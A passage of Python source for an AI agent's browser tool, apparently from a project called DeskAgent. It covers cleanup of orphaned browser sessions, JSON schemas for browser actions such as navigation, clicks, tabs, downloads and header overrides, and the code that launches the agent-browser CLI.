    with _cleanup_lock:
        tracked_names = {info.get("session_name") for info in _active_sessions.values() if info.get("session_name")}

    reaped = 0
    for socket_dir in socket_dirs:
        dir_name = os.path.basename(socket_dir)
        # dir_name is "agent-browser-{session_name}"
        session_name = dir_name.removeprefix("agent-browser-")
        if not session_name:
            continue

        # Ownership check: prefer owner_pid file (cross-process safe).
        owner_pid_file = os.path.join(socket_dir, f"{session_name}.owner_pid")
        owner_alive: bool | None = None  # None = owner_pid missing/unreadable
        if os.path.isfile(owner_pid_file):
            try:
                owner_pid = int(Path(owner_pid_file).read_text(encoding="utf-8").strip())
                # ``os.kill(pid, 0)`` is NOT a no-op on Windows (bpo-14484).
                # Use the cross-platform existence check.

                owner_alive = pid_exists(owner_pid)
            except (ValueError, OSError):
                owner_alive = None  # corrupt file — fall through

        if owner_alive is True:
            # Owner is alive — this session belongs to a live deskagent process.
            continue

        if owner_alive is None:
            # No owner_pid file (legacy daemon).  Fall back to in-process
            # tracking: if this process knows about the session, leave alone.
            if session_name in tracked_names:
                continue

        # owner_alive is False (dead owner) OR legacy daemon not tracked here.
        pid_file = os.path.join(socket_dir, f"{session_name}.pid")
        if not os.path.isfile(pid_file):
            # No daemon PID file — just a stale dir, remove it
            shutil.rmtree(socket_dir, ignore_errors=True)
            continue

        try:
            daemon_pid = int(Path(pid_file).read_text(encoding="utf-8").strip())
        except (ValueError, OSError):
            shutil.rmtree(socket_dir, ignore_errors=True)
            continue

        # Check if the daemon is still alive. ``os.kill(pid, 0)`` on Windows
        # is NOT a no-op — use the handle-based existence check.

        if not pid_exists(daemon_pid):
            shutil.rmtree(socket_dir, ignore_errors=True)
            continue

        # Daemon is alive and its owner is dead (or legacy + untracked).  Reap.
        # Use the process-tree termination helper so Chromium children
        # (renderer, GPU, etc.) are cleaned up, not just the daemon parent.
        try:
            ProcessRegistry._terminate_host_pid(daemon_pid)
            logger.info("Reaped orphaned browser daemon PID %d (session %s)", daemon_pid, session_name)
            reaped += 1
        except (ProcessLookupError, PermissionError, OSError):
            pass

        shutil.rmtree(socket_dir, ignore_errors=True)

    if reaped:
        logger.info("Reaped %d orphaned browser session(s) from previous run(s)", reaped)


def _browser_cleanup_thread_worker() -> None:
    """
    Background thread that periodically cleans up inactive browser sessions.

    Runs every 30 seconds and checks for sessions that haven't been used
    within the BROWSER_SESSION_INACTIVITY_TIMEOUT period.
    On first run, also reaps orphaned sessions from previous process lifetimes.
    """
    # One-time orphan reap on startup
    try:
        _reap_orphaned_browser_sessions()
    except Exception as e:
        logger.warning("Orphan reap error: %s", e)

    while _cleanup_running:
        try:
            _cleanup_inactive_browser_sessions()
        except Exception as e:
            logger.warning("Cleanup thread error: %s", e)
        try:
            cleanup_old_profiles(retention_hours=DEFAULT_RETENTION_HOURS)
        except Exception as e:
            logger.warning("Profile cleanup error: %s", e)

        # Sleep in 1-second intervals so we can stop quickly if needed
        for _ in range(30):
            if not _cleanup_running:
                break
            time.sleep(1)


def _start_browser_cleanup_thread() -> None:
    """Start the background cleanup thread if not already running."""
    global _cleanup_thread, _cleanup_running

    with _cleanup_lock:
        if _cleanup_thread is None or not _cleanup_thread.is_alive():
            _cleanup_running = True
            _cleanup_thread = threading.Thread(target=_browser_cleanup_thread_worker, daemon=True, name="browser-cleanup")
            _cleanup_thread.start()
            logger.info("Started inactivity cleanup thread (timeout: %ss)", BROWSER_SESSION_INACTIVITY_TIMEOUT)


def _stop_browser_cleanup_thread() -> None:
    """Stop the background cleanup thread."""
    global _cleanup_running
    _cleanup_running = False
    if _cleanup_thread is not None:
        _cleanup_thread.join(timeout=5)


def _update_session_activity(task_id: str) -> None:
    """Update the last activity timestamp for a session."""
    with _cleanup_lock:
        _session_last_activity[task_id] = time.time()


atexit.register(_stop_browser_cleanup_thread)

BROWSER_TOOL_SCHEMAS = [
    {
        "name": "browser_navigate",
        "description": "Navigate to a URL in the browser. Initializes the session and loads the page. Must be called before other browser tools. For simple information retrieval, prefer web_search or web_extract (faster, cheaper). For plain-text endpoints — URLs ending in .md, .txt, .json, .yaml, .yml, .csv, .xml, raw.githubusercontent.com, or any documented API endpoint — prefer curl via the terminal tool or web_extract; the browser stack is overkill and much slower for these. Use browser tools when you need to interact with a page (click, fill forms, dynamic content). Returns a compact page snapshot with interactive elements and ref IDs — no need to call browser_snapshot separately after navigating. For advanced browser capabilities (file downloads, multi-tab navigation, cookie injection, viewport / user-agent / geolocation configuration, element-level screenshots), use `search_tools` or rely on dynamic tool discovery (`tools.sync`) — those tools are not in the always-visible core set.",
        "parameters": {"type": "object", "properties": {"url": {"type": "string", "description": "The URL to navigate to (e.g., 'https://example.com')"}}, "required": ["url"]},
    },
    {
        "name": "browser_snapshot",
        "description": "Get a text-based snapshot of the current page's accessibility tree. Returns interactive elements with ref IDs (like @e1, @e2) for browser_click and browser_type. full=false (default): compact view with interactive elements. full=true: complete page content. Snapshots over 8000 chars are truncated or LLM-summarized. Requires browser_navigate first. Note: browser_navigate already returns a compact snapshot — use this to refresh after interactions that change the page, or with full=true for complete content.",
        "parameters": {
            "type": "object",
            "properties": {
                "full": {
                    "type": "boolean",
                    "description": "If true, returns complete page content. If false (default), returns compact view with interactive elements only.",
                    "default": False,
                }
            },
            "required": [],
        },
    },
    {
        "name": "browser_click",
        "description": "Click on an element identified by its ref ID from the snapshot (e.g., '@e5'). The ref IDs are shown in square brackets in the snapshot output. Requires browser_navigate and browser_snapshot to be called first.",
        "parameters": {
            "type": "object",
            "properties": {"ref": {"type": "string", "description": "The element reference from the snapshot (e.g., '@e5', '@e12')"}},
            "required": ["ref"],
        },
    },
    {
        "name": "browser_type",
        "description": "Type text into an input field identified by its ref ID. Clears the field first, then types the new text. Requires browser_navigate and browser_snapshot to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "ref": {"type": "string", "description": "The element reference from the snapshot (e.g., '@e3')"},
                "text": {"type": "string", "description": "The text to type into the field"},
            },
            "required": ["ref", "text"],
        },
    },
    {
        "name": "browser_scroll",
        "description": "Scroll the page in a direction. Use this to reveal more content that may be below or above the current viewport. Requires browser_navigate to be called first.",
        "parameters": {"type": "object", "properties": {"direction": {"type": "string", "enum": ["up", "down"], "description": "Direction to scroll"}}, "required": ["direction"]},
    },
    {
        "name": "browser_back",
        "description": "Navigate back to the previous page in browser history. Requires browser_navigate to be called first.",
        "parameters": {"type": "object", "properties": {}, "required": []},
    },
    {
        "name": "browser_press",
        "description": "Press a keyboard key. Useful for submitting forms (Enter), navigating (Tab), or keyboard shortcuts. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {"key": {"type": "string", "description": "Key to press (e.g., 'Enter', 'Tab', 'Escape', 'ArrowDown')"}},
            "required": ["key"],
        },
    },
    {
        "name": "browser_hover",
        "description": "Hover an element (move mouse over it) — triggers CSS :hover rules, dropdown menus, and tooltip previews without clicking. Ref IDs come from browser_snapshot output (e.g. '@e5'). Requires browser_navigate and browser_snapshot first.",
        "parameters": {
            "type": "object",
            "properties": {"ref": {"type": "string", "description": "Element reference from the snapshot (e.g. '@e5', '@e12')"}},
            "required": ["ref"],
        },
    },
    {
        "name": "browser_wait_for",
        "description": "Wait until a CSS selector or visible text substring appears in the current page (polls every 200ms via the live DOM). On a successful match the result includes a compact snapshot so you can act without a follow-up browser_snapshot. Set return_snapshot=false to disable the auto-snapshot. Requires browser_navigate first.",
        "parameters": {
            "type": "object",
            "properties": {
                "selector": {
                    "type": "string",
                    "description": "CSS selector to wait for, e.g. '.checkout-button'. Mutually exclusive gating with `text` — at least one must be provided.",
                },
                "text": {"type": "string", "description": "Case-insensitive substring of visible element text to wait for, e.g. 'Order confirmed'."},
                "timeout_s": {"type": "number", "default": 10, "description": "Maximum wait in seconds (default 10)."},
                "return_snapshot": {
                    "type": "boolean",
                    "default": True,
                    "description": "If true (default), include a compact snapshot in the success result. If false, only return the matched element description.",
                },
            },
            "required": [],
        },
    },
    {
        "name": "browser_find",
        "description": "Search the live DOM for elements whose visible text matches a substring. Use this when you want a snapshot ref by text instead of grepping the previous browser_snapshot output (which may be stale after dynamic re-rendering). Returns up to 200 matches. Requires browser_navigate first.",
        "parameters": {
            "type": "object",
            "properties": {
                "query": {"type": "string", "description": "Case-insensitive text substring to search for, e.g. 'Sign in' or 'Continue'."},
                "ref_only": {"type": "boolean", "default": True, "description": "If true (default), only return ref IDs. If false, also include tag and text for each match."},
            },
            "required": ["query"],
        },
    },
    {
        "name": "browser_drag",
        "description": "Drag an element from one snapshot position to another. Dispatches a CDP mouse event sequence (press → move → release) between the two refs. Works with sortable lists, sliders, and drag-and-drop UIs. Requires browser_navigate and browser_snapshot first.",
        "parameters": {
            "type": "object",
            "properties": {
                "from_ref": {"type": "string", "description": "Source element ref from browser_snapshot (e.g. '@e3')."},
                "to_ref": {"type": "string", "description": "Target element ref from browser_snapshot (e.g. '@e7')."},
                "hold_key": {"type": "string", "enum": ["shift", "ctrl", "alt"], "description": "Optional modifier key held during the drag."},
            },
            "required": ["from_ref", "to_ref"],
        },
    },
    {
        "name": "browser_select",
        "description": "Select an option in a <select> element or a common custom dropdown (Ant Design, Element UI, Material UI, React Select, etc.). For native <select>, sets the value directly. For custom dropdowns, clicks to open then matches by visible text. Requires browser_navigate and browser_snapshot first.",
        "parameters": {
            "type": "object",
            "properties": {
                "ref": {"type": "string", "description": "Element ref of the <select> or custom dropdown trigger (e.g. '@e4')."},
                "value": {"type": "string", "description": "Exact option value attribute to select."},
                "label": {"type": "string", "description": "Case-insensitive substring of the visible option text to select."},
                "index": {"type": "integer", "description": "0-based option index to select."},
                "open_delay_s": {
                    "type": "number",
                    "default": 0.5,
                    "description": "Seconds to wait after clicking a custom dropdown for its animation to finish before searching for options (default 0.5).",
                },
            },
            "required": ["ref"],
        },
    },
    {
        "name": "browser_download",
        "description": "Download a file by clicking a link (ref) or navigating to a URL. Blocks until the download completes and returns the local file path. Requires a CDP-capable backend. Files are saved to the browser_downloads cache (24h auto-cleanup).",
        "parameters": {
            "type": "object",
            "properties": {
                "ref_or_url": {"type": "string", "description": "A snapshot ref (@e5) to click, or a full URL to navigate to."},
                "save_as": {"type": "string", "description": "Optional filename override. If omitted, uses the browser's suggested filename."},
                "timeout_s": {"type": "number", "default": 30, "description": "Max seconds to wait for the download to complete (default 30)."},
            },
            "required": ["ref_or_url"],
        },
    },
    {
        "name": "browser_pdf",
        "description": "Save the current page as a PDF file. Requires a CDP-capable backend (local Chrome or CDP override). Returns the file path, page count, and SHA-256 hash.",
        "parameters": {
            "type": "object",
            "properties": {
                "save_as": {"type": "string", "description": "Optional filename (without path). Defaults to page_<id>.pdf."},
                "landscape": {"type": "boolean", "default": False, "description": "If true, use landscape orientation."},
                "print_background": {"type": "boolean", "default": True, "description": "If true (default), include background graphics."},
                "paper_width": {"type": "number", "default": 8.5, "description": "Page width in inches (default 8.5 / Letter)."},
                "paper_height": {"type": "number", "default": 11, "description": "Page height in inches (default 11 / Letter)."},
            },
            "required": [],
        },
    },
    {
        "name": "browser_screenshot_element",
        "description": "Capture a screenshot of a single element identified by its snapshot ref. Returns the image file path. Uses getBoundingClientRect for positioning — CSS transforms (rotate/scale) are not accounted for. Requires a CDP-capable backend.",
        "parameters": {
            "type": "object",
            "properties": {
                "ref": {"type": "string", "description": "Element ref from browser_snapshot (e.g. '@e5')."},
                "save_as": {"type": "string", "description": "Optional filename (without path). Defaults to element_<id>.png."},
            },
            "required": ["ref"],
        },
    },
    {
        "name": "browser_tab_new",
        "description": "Open a new browser tab and switch to it. The new tab becomes the active target — subsequent browser_* calls operate on it. Requires a CDP-capable backend (not Camofox).",
        "parameters": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Optional URL to navigate the new tab to. If omitted, opens an empty tab."},
            },
            "required": [],
        },
    },
    {
        "name": "browser_tab_switch",
        "description": "Switch the active tab to tab_id. Subsequent CDP operations route there. tab_id values come from browser_tab_list or browser_tab_new.",
        "parameters": {
            "type": "object",
            "properties": {
                "tab_id": {"type": "string", "description": "The target tab ID (e.g. 'ABC123...')."},
            },
            "required": ["tab_id"],
        },
    },
    {
        "name": "browser_tab_close",
        "description": "Close a tab. Defaults to closing the currently active tab. After close, CDP routing falls back to the initial page if the closed tab was active.",
        "parameters": {
            "type": "object",
            "properties": {
                "tab_id": {"type": "string", "description": "Tab ID to close. If omitted, closes the active tab."},
            },
            "required": [],
        },
    },
    {
        "name": "browser_tab_list",
        "description": "List all browser tabs currently open. Read-only — does not mutate state. Returns tab_id, url, title, and active_tab_id.",
        "parameters": {"type": "object", "properties": {}, "required": []},
    },
    {
        "name": "browser_set_viewport",
        "description": "Override the browser viewport size (CDP Emulation.setDeviceMetricsOverride). Persists until next call or page reload. Use to test mobile layouts without a real device. Requires a CDP-capable backend.",
        "parameters": {
            "type": "object",
            "properties": {
                "width": {"type": "integer", "description": "Viewport width in CSS pixels."},
                "height": {"type": "integer", "description": "Viewport height in CSS pixels."},
                "device_scale_factor": {"type": "number", "default": 1.0, "description": "Device pixel ratio (default 1.0)."},
                "mobile": {"type": "boolean", "default": False, "description": "If true, the browser reports a mobile UA and viewport."},
            },
            "required": ["width", "height"],
        },
    },
    {
        "name": "browser_set_user_agent",
        "description": "Override the user-agent string sent on subsequent navigations (CDP Network.setUserAgentOverride). Pass None to clear the override.",
        "parameters": {
            "type": "object",
            "properties": {
                "user_agent": {"type": "string", "description": "Full UA override (e.g. 'Mozilla/5.0 ... Mobile/15E148 Safari/604.1')."},
                "platform": {"type": "string", "description": "Optional navigator.platform value (e.g. 'iPhone')."},
                "accept_language": {"type": "string", "description": "Optional Accept-Language header (e.g. 'en-US,en;q=0.9')."},
            },
            "required": [],
        },
    },
    {
        "name": "browser_set_extra_headers",
        "description": "Replace all extra HTTP headers sent on subsequent navigations (CDP Network.setExtraHTTPHeaders). Wholesale replacement — pass the complete desired set. Empty dict clears all overrides.",
        "parameters": {
            "type": "object",
            "properties": {
                "headers": {
                    "type": "object",
                    "description": 'Header name → value map, e.g. {"Referer": "https://example.com", "X-API-Key": "secret"}.',
                    "additionalProperties": {"type": "string"},
                },
            },
            "required": ["headers"],
        },
    },
    {
        "name": "browser_set_geolocation",
        "description": "Override browser-reported geolocation (CDP Emulation.setGeolocationOverride). Subsequent pages see injected coords via navigator.geolocation. Pass lat=NaN to clear.",
        "parameters": {
            "type": "object",
            "properties": {
                "lat": {"type": "number", "description": "Latitude in decimal degrees. NaN clears the override."},
                "lon": {"type": "number", "description": "Longitude in decimal degrees."},
                "accuracy": {"type": "number", "default": 100, "description": "Accuracy in meters (default 100)."},
            },
            "required": ["lat", "lon"],
        },
    },
    {
        "name": "browser_get_images",
        "description": "Get a list of all images on the current page with their URLs and alt text. Useful for finding images to analyze with the vision tool. Requires browser_navigate to be called first.",
        "parameters": {"type": "object", "properties": {}, "required": []},
    },
    {
        "name": "browser_vision",
        "description": "Take a screenshot of the current page so you can inspect it visually. Use this when you need to understand what the page looks like - especially for CAPTCHAs, visual verification challenges, complex layouts, or cases where the text snapshot misses important visual information. When your active model has native vision, the screenshot is attached to your context directly and you inspect it on the next turn; otherwise DeskAgent falls back to an auxiliary vision model and returns a text analysis. Includes a screenshot_path that you can share with the user by including MEDIA:<screenshot_path> in your response. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "question": {"type": "string", "description": "What you want to know about the page visually. Be specific about what you're looking for."},
                "annotate": {
                    "type": "boolean",
                    "default": False,
                    "description": "If true, overlay numbered [N] labels on interactive elements. Each [N] maps to ref @eN for subsequent browser commands. Useful for QA and spatial reasoning about page layout.",
                },
            },
            "required": ["question"],
        },
    },
    {
        "name": "browser_console",
        "description": "Get browser console output and JavaScript errors from the current page. Returns console.log/warn/error/info messages and uncaught JS exceptions. Use this to detect silent JavaScript errors, failed API calls, and application warnings. Requires browser_navigate to be called first. When 'expression' is provided, evaluates JavaScript in the page context and returns the result — use this for DOM inspection, reading page state, or extracting data programmatically.",
        "parameters": {
            "type": "object",
            "properties": {
                "clear": {"type": "boolean", "default": False, "description": "If true, clear the message buffers after reading"},
                "expression": {
                    "type": "string",
                    "description": "JavaScript expression to evaluate in the page context. Runs in the browser like DevTools console — full access to DOM, window, document. Return values are serialized to JSON. Example: 'document.title' or 'document.querySelectorAll(\"a\").length'",
                },
            },
            "required": [],
        },
    },
]


def _create_local_session(task_id: str) -> dict[str, str]:
    session_name = f"h_{uuid.uuid4().hex[:10]}"
    logger.info("Created local browser session %s for task %s", session_name, task_id)
    profile_dir = resolve_profile_dir()
    profile_in_use = is_profile_locked(profile_dir)
    return {
        "session_name": session_name,
        "cdp_url": None,
        "profile_dir": str(profile_dir),
        "profile_in_use": profile_in_use,
        "features": {"local": True},
    }


def _create_cdp_session(task_id: str, cdp_url: str) -> dict[str, str]:
    """Create a session that connects to a user-supplied CDP endpoint."""

    session_name = f"cdp_{uuid.uuid4().hex[:10]}"
    logger.info("Created CDP browser session %s → %s for task %s", session_name, cdp_url, task_id)
    return {
        "session_name": session_name,
        "cdp_url": cdp_url,
        "features": {"cdp_override": True},
    }


def _get_session_info(task_id: str | None = None) -> dict[str, str]:
    """
    Get or create session info for the given session key.

    In CDP override mode, returns a session that proxies to the user-supplied
    Chrome DevTools endpoint. In all other cases, generates a session name for
    agent-browser --session running local Chromium (the ``::local`` sidecar
    suffix routes LAN/private URLs to a local browser).  Also starts the
    inactivity cleanup thread and updates activity tracking. Thread-safe:
    multiple subagents can call this concurrently.

    Args:
        task_id: Session key.  Normally the task_id as-is, but may carry the
            ``::local`` suffix for the hybrid-routing local sidecar — in that
            case the CDP override (if any) is bypassed and a local Chromium
            session is created instead.

    Returns:
        Dict with session_name (always) and cdp_url (CDP override only).
    """
    if task_id is None:
        task_id = "default"

    _start_browser_cleanup_thread()

    _update_session_activity(task_id)

    with _cleanup_lock:
        if task_id in _active_sessions:
            return _active_sessions[task_id]

    # Hybrid routing: session keys ending with ``::local`` force a local
    # Chromium even when the user-supplied ``browser.cdp_url`` is set. Public
    # URLs in the same conversation continue to use the CDP session under the
    # bare task_id key.
    force_local = _is_local_sidecar_key(task_id)

    cdp_override = _get_cdp_override()
    if cdp_override and not force_local:
        session_info = _create_cdp_session(task_id, cdp_override)
    else:
        session_info = _create_local_session(task_id)

    with _cleanup_lock:
        # Double-check: another thread may have created a session while we
        # were doing the network call. Use the existing one to avoid leaking
        # orphan sessions.
        if task_id in _active_sessions:
            return _active_sessions[task_id]
        _active_sessions[task_id] = session_info

    # Lazy-start the CDP supervisor now that the session exists (if the
    # backend surfaces a CDP URL via override or session_info["cdp_url"]).
    # Idempotent; swallows errors. See _ensure_cdp_supervisor for details.
    # Skip for local sidecars — they have no CDP URL.
    if not force_local:
        _ensure_cdp_supervisor(task_id)

    return session_info


def _find_agent_browser() -> str:
    """
    Find the agent-browser CLI executable.

    Checks in order: current PATH, Homebrew/common bin dirs, DeskAgent-managed
    node, local node_modules/.bin/, npx fallback.

    Returns:
        Path to agent-browser executable

    Raises:
        FileNotFoundError: If agent-browser is not installed
    """
    global _cached_agent_browser, _agent_browser_resolved
    if _agent_browser_resolved:
        if _cached_agent_browser is None:
            raise FileNotFoundError(
                "agent-browser CLI not found (cached). Install it with: "
                f"{_browser_install_hint()}\n"
                "Or run 'npm install' in the repo root to install locally.\n"
                "Or ensure npx is available in your PATH."
            )
        return _cached_agent_browser

    # Note: _agent_browser_resolved is set at each return site below
    # (not before the search) to prevent a race where a concurrent thread
    # sees resolved=True but _cached_agent_browser is still None.

    which_result = shutil.which("agent-browser")
    if which_result:
        _cached_agent_browser = which_result
        _agent_browser_resolved = True
        return which_result

    # Build an extended search PATH including DeskAgent-managed Node, macOS
    # versioned Homebrew installs, and fallback system dirs like Termux.
    extended_path = _merge_browser_path("")
    if extended_path:
        which_result = shutil.which("agent-browser", path=extended_path)
        if which_result:
            _cached_agent_browser = which_result
            _agent_browser_resolved = True
            return which_result

    # On Windows, npm drops three shims in .bin: an extensionless POSIX shell
    # script (for Git Bash / WSL), `agent-browser.cmd` (for cmd/PowerShell),
    # and `agent-browser.ps1` (for PowerShell). CreateProcess (used by Python's
    # subprocess on Windows) cannot execute the extensionless shim — it raises
    # WinError 193 "%1 is not a valid Win32 application". We must resolve to the
    # `.cmd` shim instead. `shutil.which` consults PATHEXT, so we delegate to it
    # with an explicit path so POSIX hosts still pick the extensionless shim.
    repo_root = Path(__file__).parent.parent
    local_bin_dir = repo_root / "node_modules" / ".bin"
    if local_bin_dir.is_dir():
        local_which = shutil.which("agent-browser", path=str(local_bin_dir))
        if local_which:
            _cached_agent_browser = local_which
            _agent_browser_resolved = True
            return _cached_agent_browser

    npx_path = shutil.which("npx")
    if not npx_path and extended_path:
        npx_path = shutil.which("npx", path=extended_path)
    if npx_path:
        _cached_agent_browser = "npx agent-browser"
        _agent_browser_resolved = True
        return _cached_agent_browser

    _agent_browser_resolved = True
    raise FileNotFoundError(
        "agent-browser CLI not found. Install it with: "
        f"{_browser_install_hint()}\n"
        "Or run 'npm install' in the repo root to install locally.\n"
        "Or ensure npx is available in your PATH."
    )


def _extract_screenshot_path_from_text(text: str) -> str | None:
    """Extract a screenshot file path from agent-browser human-readable output."""
    if not text:
        return None

    patterns = [
        r"Screenshot saved to ['\"](?P<path>/[^'\"]+?\.png)['\"]",
        r"Screenshot saved to (?P<path>/\S+?\.png)(?:\s|$)",
        r"(?P<path>/\S+?\.png)(?:\s|$)",
    ]

    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            path = match.group("path").strip().strip("'\"")
            if path:
                return path

    return None


def _run_browser_command(
    task_id: str,
    command: str,
    args: list[str] | None = None,
    timeout: int | None = None,
    _engine_override: str | None = None,
) -> dict[str, Any]:
    """
    Run an agent-browser CLI command against our active session.

    Args:
        task_id: Task identifier to get the right session
        command: The command to run (e.g., "open", "click")
        args: Additional arguments for the command
        timeout: Command timeout in seconds.  ``None`` reads
                 ``browser.command_timeout`` from config (default 30s).
        _engine_override: Force a specific engine for this call only.  Used
                          internally by the Lightpanda fallback to retry with
                          Chrome without touching global state.

    Returns:
        Parsed JSON response from agent-browser
    """
    if timeout is None:
        timeout = _get_command_timeout()
    args = args or []

    try:
        browser_cmd = _find_agent_browser()
    except FileNotFoundError as e:
        logger.warning("agent-browser CLI not found: %s", e)
        return {"success": False, "error": str(e)}

    if _requires_real_termux_browser_install(browser_cmd):
        error = _termux_browser_install_error()
        logger.warning("browser command blocked on Termux: %s", error)
        return {"success": False, "error": error}

    # Local mode with no Chromium on disk: fail fast with an actionable
    # message instead of hanging for _command_timeout seconds per call.
    # Skip when engine=lightpanda — LP doesn't need Chromium for navigation.
    if not _chromium_installed() and _get_browser_engine() != "lightpanda":
        if _running_in_docker():
            hint = (
                "Chromium browser is missing. You're running in Docker — pull the latest image to get the bundled Chromium: docker pull ghcr.io/nousresearch/deskagent-agent:latest"
            )
        else:
            hint = "Chromium browser is missing. Install it with: npx agent-browser install --with-deps (or: npx playwright install --with-deps chromium)"
        logger.warning("browser command blocked: %s", hint)
        return {"success": False, "error": hint}

    if is_interrupted():
        return {"success": False, "error": "Interrupted"}

    try:
        session_info = _get_session_info(task_id)
    except Exception as e:
        logger.warning("Failed to create browser session for task=%s: %s", task_id, e)
        return {"success": False, "error": f"Failed to create browser session: {str(e)}"}

    # CDP override mode: --cdp <websocket_url> connects to the user-supplied
    # browser endpoint.  Local mode: --session <name> launches a local headless
    # Chromium.  The rest of the command (--json, command, args) is identical.
    if session_info.get("cdp_url"):
        # CDP override — talk to an externally-owned browser over its CDP WS.
        # IMPORTANT: Do NOT pass --session with --cdp. In agent-browser >=0.13,
        # --session creates a local browser instance and silently ignores --cdp.
        backend_args = ["--cdp", session_info["cdp_url"]]
    else:
        # Local mode — launch a headless Chromium instance
        backend_args = ["--session", session_info["session_name"]]
        # Persist cookies / localStorage across runs by pointing
        # agent-browser at our profile dir. Skip when an existing lock
        # is held — that's another live runner instance and we'd race
        # with it.
        profile_dir = session_info.get("profile_dir")
        if profile_dir and not session_info.get("profile_in_use"):
            backend_args += ["--user-data-dir", profile_dir]  # type: ignore[arg-type]

    # Lightpanda engine injection (local mode only, agent-browser v0.25.3+).
    # Use the resolved session backend rather than global cloud-provider state:
    # hybrid private-URL routing can create a local sidecar while a cloud
    # provider remains configured for public URLs.
    engine = _engine_override or _get_browser_engine()
    if engine != "auto" and not is_camofox_mode() and not session_info.get("cdp_url"):
        backend_args += ["--engine", engine]

    # Keep concrete executable paths intact, even when they contain spaces.
    # Only the synthetic npx fallback needs to expand into multiple argv items.
    # shutil.which resolves npx → npx.cmd on Windows; bare "npx" stays on POSIX.
    if browser_cmd == "npx agent-browser":
        _npx_bin = shutil.which("npx") or "npx"
        cmd_prefix = [_npx_bin, "agent-browser"]
    else:
        cmd_prefix = [browser_cmd]

    cmd_parts = cmd_prefix + backend_args + ["--json", command] + args

    try:
        # Give each task its own socket directory to prevent concurrency conflicts.
        # Without this, parallel workers fight over the same default socket path,
        # causing "Failed to create socket directory: Permission denied" errors.
        task_socket_dir = os.path.join(_socket_safe_tmpdir(), f"agent-browser-{session_info['session_name']}")
        os.makedirs(task_socket_dir, mode=0o700, exist_ok=True)
        # Record this deskagent PID as the session owner (cross-process safe
        # orphan detection — see _write_owner_pid).
        _write_owner_pid(task_socket_dir, session_info["session_name"])
        logger.debug("browser cmd=%s task=%s socket_dir=%s (%d chars)", command, task_id, task_socket_dir, len(task_socket_dir))

        browser_env = {**os.environ}

        # Ensure subprocesses inherit the same browser-specific PATH fallbacks
        # used during CLI discovery.
        browser_env["PATH"] = _merge_browser_path(browser_env.get("PATH", ""))
        browser_env["AGENT_BROWSER_SOCKET_DIR"] = task_socket_dir

        # Tell the agent-browser daemon to self-terminate after being idle
        # for our configured inactivity timeout.  This is the daemon-side
        # counterpart to our Python-side _cleanup_inactive_browser_sessions
        # — the daemon kills itself and its Chrome children when no CLI
        # commands arrive within the window.  Added in agent-browser 0.24.
        if "AGENT_BROWSER_IDLE_TIMEOUT_MS" not in browser_env:
            idle_ms = str(BROWSER_SESSION_INACTIVITY_TIMEOUT * 1000)
            browser_env["AGENT_BROWSER_IDLE_TIMEOUT_MS"] = idle_ms

        # Inject --no-sandbox when needed:
        # - Running as root: Chromium always refuses to start without it
        # - Ubuntu 23.10+ / AppArmor systems: unprivileged user namespaces
        #   are restricted, causing Chromium to exit with "No usable sandbox"
        #   even for non-root users running under systemd or containers.
        # Honour either the legacy AGENT_BROWSER_CHROME_FLAGS (never consumed by
        # agent-browser itself, but documented in older notes) or the real
        # AGENT_BROWSER_ARGS — if the user pre-sets either, don't overwrite it.
        if "AGENT_BROWSER_ARGS" not in browser_env and "AGENT_BROWSER_CHROME_FLAGS" not in browser_env:
            _needs_sandbox_bypass = False
            if hasattr(os, "geteuid") and os.geteuid() == 0:
                _needs_sandbox_bypass = True
                logger.debug("browser: running as root — injecting --no-sandbox")
            else:
                # Detect AppArmor user namespace restrictions (Ubuntu 23.10+)
                _userns_restrict = "/proc/sys/kernel/apparmor_restrict_unprivileged_userns"
                try:
                    with open(_userns_restrict, encoding="utf-8") as _f:
                        if _f.read().strip() == "1":
                            _needs_sandbox_bypass = True
                            logger.debug("browser: AppArmor userns restrictions detected — injecting --no-sandbox")
                except OSError:
                    pass
            if _needs_sandbox_bypass:
                browser_env["AGENT_BROWSER_ARGS"] = "--no-sandbox,--disable-dev-shm-usage"

        # Use temp files for stdout/stderr instead of pipes.
        # agent-browser starts a background daemon that inherits file
        # descriptors.  With capture_output=True (pipes), the daemon keeps
        # the pipe fds open after the CLI exits, so communicate() never
        # sees EOF and blocks until the timeout fires.
        stdout_path = os.path.join(task_socket_dir, f"_stdout_{command}")
        stderr_path = os.path.join(task_socket_dir, f"_stderr_{command}")
        stdout_fd = os.open(stdout_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        stderr_fd = os.open(stderr_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        try:
            # See matching comment at the other Popen site above — on
            # Windows we put agent-browser in its own process group, force

            # three explicit handles (no leaked parent-console handles to
            # confuse the Rust binary's daemon-spawn), and close_fds=True to
            # block inheritance of everything else.
            _popen_extra: dict = {}
            if os.name == "nt":
                # See matching block at the other Popen site — CREATE_NO_WINDOW
                # only, NO CREATE_NEW_PROCESS_GROUP (cancels asyncio loop task
                # on Python 3.11 Windows → KeyboardInterrupt in CLI MainThread).
                _popen_extra["creationflags"] = CREATE_NO_WINDOW
                _popen_extra["close_fds"] = True
                _si = subprocess.STARTUPINFO()
                _si.dwFlags |= subprocess.STARTF_USESTDHANDLES
                _popen_extra["startupinfo"] = _si
            proc = subprocess.Popen(
                cmd_parts,
                stdout=stdout_fd,
                stderr=stderr_fd,
                stdin=subprocess.DEVNULL,
                env=browser_env,
                **_popen_extra,
            )
        finally:
            os.close(stdout_fd)
            os.close(stderr_fd)

        try:
            proc.wait(timeout=timeout)
        except subprocess.TimeoutExpired:
            if not kill_tree(proc.pid, force=True):
                proc.kill()
            proc.wait()
            logger.warning("browser '%s' timed out after %ds (task=%s, socket_dir=%s)", command, timeout, task_id, task_socket_dir)
            result = {"success": False, "error": f"Command timed out after {timeout} seconds"}

        else:
            with open(stdout_path, encoding="utf-8") as f:
                stdout = f.read()
            with open(stderr_path, encoding="utf-8") as f:
                stderr = f.read()
            returncode = proc.returncode

            # Clean up temp files (best-effort)
            for p in (stdout_path, stderr_path):
                with contextlib.suppress(OSError):
                    os.unlink(p)

            if stderr and stderr.strip():
                level = logging.WARNING if returncode != 0 else logging.DEBUG
                logger.log(level, "browser '%s' stderr: %s", command, stderr.strip()[:500])

            stdout_text = stdout.strip()

            # Empty output with rc=0 is a broken state — treat as failure rather
